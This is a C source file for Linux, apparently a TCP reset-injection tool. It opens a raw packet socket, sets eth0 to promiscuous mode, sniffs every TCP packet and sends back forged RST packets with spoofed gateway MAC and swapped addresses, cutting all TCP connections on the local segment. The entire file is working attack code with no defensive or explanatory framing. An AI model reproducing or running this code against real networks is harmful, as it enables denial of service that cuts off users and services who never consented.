#include<unistd.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<signal.h>
#include<asm/types.h>
#include<linux/sockios.h>
#include<linux/in.h>
#include<linux/if.h>
#include<linux/if_ether.h>
#include<linux/ip.h>
#include<linux/tcp.h>
#include<linux/if_packet.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
struct psuedohdr  {
   __u32 source_address;
   __u32 dest_address;
   unsigned char place_holder;
   unsigned char protocol;
   unsigned short length;
} psuedohdr;
void get_ifindex(char *);
void set_promisc(char *);
void if_restore(int);
void capture(void);
void analyze_pack(int);
void kill_tcp(__u32 ,__u32 ,__u8 ,__u16);
void send_rst(void);
void err_quit(char *);
void build_ether(struct ethhdr **eth);
void build_ip(struct iphdr **ip,__u32 daddr,__u32 saddr);
void build_tcp(struct tcphdr **,__u16,__u16,__u32,__u32,__u32,__u32);
unsigned short trans_check(unsigned char ,char *,int,
                __u32,__u32);
int in_cksum(unsigned short *,int );
int s;
int ifindex;
char *device="eth0";
unsigned char *gateway="\x00\x11\x20\x95\x96\x00";
unsigned char dst_mac[6];
char capbuf[2048];
char outpack[2048];
struct sockaddr_ll sll;
main()
{
        struct sigaction sa;
        int size;
        memset(&sa,0,sizeof(struct sigaction));
        sa.sa_handler=if_restore;
        sigaction(SIGINT,&sa,NULL);
        if((s=socket(AF_PACKET,SOCK_RAW,0))<0)
                err_quit("socket");
        size=128*1024;
        get_ifindex(device);
        sll.sll_family=AF_PACKET;
        sll.sll_ifindex=ifindex;
        sll.sll_protocol=htons(ETH_P_IP);
        bind(s,(struct sockaddr *)&sll,sizeof(sll));
        sll.sll_halen=6;
//        memcpy(sll.sll_addr,"\x00\x03\x0d\x09\x91\x7f",6);
        setsockopt(s,SOL_SOCKET,SO_RCVBUF,&size,sizeof(size));
        set_promisc(device);
        size=sizeof(sll);
        getsockname(s,(struct sockaddr *)&sll,&size);
        capture();
}
void get_ifindex(char *dev)
{
        struct ifreq ifr;
       
        memset(&ifr,0,sizeof(ifr));
        strncpy(ifr.ifr_name,dev,sizeof(ifr.ifr_name)-1);
        ifr.ifr_name[sizeof(ifr.ifr_name)-1]='\0';
        if(ioctl(s,SIOCGIFINDEX,&ifr)<0)
                err_quit("ioctl");
        ifindex=ifr.ifr_ifindex;
}
void set_promisc(char *dev)
{
        struct ifreq ifr;
       
        memset(&ifr,0,sizeof(struct ifreq));
        strncpy(ifr.ifr_name,dev,sizeof(ifr.ifr_name)-1);
        ifr.ifr_name[sizeof(ifr.ifr_name)-1]='\0';
        if(ioctl(s,SIOCGIFFLAGS,&ifr)<0)
                err_quit("ioctl");
        ifr.ifr_flags|=IFF_PROMISC;
        if(ioctl(s,SIOCSIFFLAGS,&ifr)<0)
                err_quit("ioctl");
}
void if_restore(int signo)
{
        struct ifreq ifr;
       
        memset(&ifr,0,sizeof(struct ifreq));
        strncpy(ifr.ifr_name,device,sizeof(ifr.ifr_name)-1);
        ifr.ifr_name[sizeof(ifr.ifr_name)-1]='\0';
        if(ioctl(s,SIOCGIFFLAGS,&ifr)<0)
                err_quit("ioctl");
        ifr.ifr_flags&=~IFF_PROMISC;
        if(ioctl(s,SIOCSIFFLAGS,&ifr)<0)
                err_quit("ioctl");
        kill(getpid(),SIGTERM);
}
void capture(void)
{
        int cc;
        while(1)
        {
                memset(capbuf,0,2048);
                cc=recvfrom(s,capbuf,2048,0,NULL,NULL);
                if(cc<0)
                {
                        perror("recvfrom");
                        continue;
                }
                analyze_pack(cc);
        }
}
void analyze_pack(int len)
{
        struct ethhdr *eth;
        struct iphdr *ip;
        eth=(struct ethhdr *)capbuf;
        if(eth->h_proto!=htons(ETH_P_IP))
                return;
        //if(memcmp(eth->h_dest,gateway,6))
        //        return;
        ip=(struct iphdr *)(eth+1);
        if(ip->protocol!=IPPROTO_TCP)
                return;
        memcpy(dst_mac,eth->h_source,6);
        kill_tcp(ip->saddr,ip->daddr,ip->ihl,ip->tot_len);
}
void kill_tcp(__u32 saddr,__u32 daddr,__u8 hlen,__u16 totlen)
{
        struct ethhdr *eth;
        struct iphdr *ip;
        struct tcphdr *tcp,*recv;
        memset(outpack,0,2048);
        eth=(struct ethhdr *)outpack;
        ip=(struct iphdr *)(eth+1);
        tcp=(struct tcphdr *)((char *)ip+hlen*4);
        recv=(struct tcphdr *)(capbuf+14+hlen*4);
        build_ether(&eth);
        build_ip(&ip,saddr,daddr);
        build_tcp(&tcp,recv->source,recv->dest,
                        recv->ack_seq,recv->seq,ip->saddr,ip->daddr);
//        printf("send to %s\n",inet_ntoa(daddr));
        send_rst();
}
void build_ether(struct ethhdr **eth)
{
        struct ethhdr *p=*eth;
        memcpy(p->h_dest,dst_mac,6);
        memcpy(p->h_source,gateway,6);
        p->h_proto=htons(ETH_P_IP);
        return;
}
       
void build_ip(struct iphdr **ip,__u32 daddr,__u32 saddr)
{
        struct iphdr *p=*ip;
       
        p->ihl=5;
        p->version=4;
        p->tos=0;
        p->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
        p->id=htons(12345);
        p->frag_off=0;
        p->ttl=64;
        p->protocol=IPPROTO_TCP;
        p->check=0;
        p->saddr=saddr;
        p->daddr=daddr;
        p->check=(unsigned short)in_cksum((unsigned short *)p,sizeof(struct iphdr));
        return;       
}
void build_tcp(struct tcphdr **tcp,__u16 dport,__u16 sport,
                __u32 seq,__u32 ack,__u32 daddr,__u32 saddr)
{
        struct tcphdr *p=*tcp;
        //p->source=htons(sport);
//        p->dest=htons(dport);
        memcpy(&p->source,&sport,sizeof(__u16));
        memcpy(&p->dest,&dport,sizeof(__u16));
        p->seq=seq;
        p->ack=htonl(ntohl(ack)+1);
        p->res1=0;
        p->doff=5;
        p->rst=1;
        p->window=htons(1024);
        p->check=trans_check(IPPROTO_TCP,(unsigned char *)p,
                        sizeof(struct tcphdr),
                        saddr,daddr);
        return;
}
void send_rst(void)
{
        int size=14+20+20;
        int cc;
        cc=sendto(s,outpack,size,0,(struct sockaddr *)&sll,sizeof(sll));
        if(cc!=size)
                err_quit("sendto");
}
       
unsigned short trans_check(unsigned char proto,
             char *packet,
             int length,
             __u32 source_address,
             __u32 dest_address)
{
   char *psuedo_packet;
   unsigned short answer;
   
   psuedohdr.protocol = proto;
   psuedohdr.length = htons(length);
   psuedohdr.place_holder = 0;
   psuedohdr.source_address = source_address;
   psuedohdr.dest_address = dest_address;
   
   if((psuedo_packet =(char *)malloc(sizeof(psuedohdr) + length)) == NULL)  {
     perror("malloc");
     exit(1);
   }
   
   memcpy(psuedo_packet,&psuedohdr,sizeof(psuedohdr));
   memcpy((psuedo_packet + sizeof(psuedohdr)),
     packet,length);
   
   answer = (unsigned short)in_cksum((unsigned short *)psuedo_packet,
                 (length + sizeof(psuedohdr)));
   free(psuedo_packet);
   return answer;
}
#undef        ADDCARRY
#define ADDCARRY(sum) { \
        if (sum & 0xffff0000) {        \
                sum &= 0xffff; \
                sum++; \
        } \
}
int in_cksum(u_short *addr, int len)
{
        union word {
                char        c[2];
                u_short        s;
        } u;
        int sum = 0;
        while (len > 0) {
                /*
                 * add by words.
                 */
                while ((len -= 2) >= 0) {
                        if ((unsigned long)addr & 0x1) {
                                /* word is not aligned */
                                u.c[0] = *(char *)addr;
                                u.c[1] = *((char *)addr+1);
                                sum += u.s;
                                addr++;
                        } else
                                sum += *addr++;
                        ADDCARRY(sum);
                }
                if (len == -1)
                        /*
                         * Odd number of bytes.
                         */
                        u.c[0] = *(u_char *)addr;
        }
        if (len == -1) {
                /* The last mbuf has odd # of bytes. Follow the
                   standard (the odd byte is shifted left by 8 bits) */
                u.c[1] = 0;
                sum += u.s;
                ADDCARRY(sum);
        }
        return (~sum & 0xffff);
}
void err_quit(char *p)
{
        perror(p);
        exit(1);
}